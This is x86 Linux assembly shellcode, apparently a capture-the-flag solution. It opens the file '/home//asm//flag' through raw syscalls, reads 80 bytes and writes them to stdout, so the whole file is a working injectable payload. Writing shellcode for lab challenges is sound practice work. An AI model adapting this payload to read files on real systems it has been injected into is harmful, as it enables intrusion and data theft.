SECTION .text
global _start

_start:
	xor eax, eax
	push eax

	push 0x67616c66         ;파일 경로
	push 0x2f2f6d73
	push 0x612f2f65
	push 0x6d6f682f
	mov ecx, eax
	mov ebx, esp
	mov al, 0x5
	int 0x80         ;open("/home//asm//flag", 0);

	xor edx, edx
	mov dl, 0x50
	sub esp, 0x50
	mov ecx, esp
	mov edi, ecx
	mov ebx, eax
	xor eax, eax
	mov al, 0x3
	int 0x80        ;read(eax, buf, 0x50);

	mov ecx, edi
	xor ebx, ebx
	xor eax, eax
	mov bl, 0x1
	mov al, 0x4
	int 0x80      ;write(1, buf);

	 
